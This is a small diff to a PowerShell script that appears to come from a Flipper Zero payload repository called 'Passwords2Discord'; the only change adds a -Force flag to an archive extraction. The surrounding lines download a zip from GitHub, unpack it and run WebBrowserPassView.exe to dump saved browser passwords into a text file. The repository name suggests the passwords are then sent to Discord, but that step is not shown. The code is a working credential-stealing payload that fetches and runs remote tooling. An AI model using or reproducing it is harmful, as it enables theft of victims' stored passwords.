@@ -10,7 +10,7 @@ $headers = @{
 
 Invoke-WebRequest -Headers $headers -Uri https://github.com/Agente404/flipper/raw/main/payloads/Passwords2Discord/wbpv.zip -OutFile wbpv.zip | Wait-Process;
 
-Expand-Archive "wbpv.zip" -DestinationPath "wbpv" | Wait-Process;
+Expand-Archive "wbpv.zip" -DestinationPath "wbpv" -Force | Wait-Process;
 Remove-Item "wbpv.zip" -Force;
 
 Start-Process -FilePath "wbpv\WebBrowserPassView.exe" -Args "/stext wbpv\pwd.txt" -Wait;
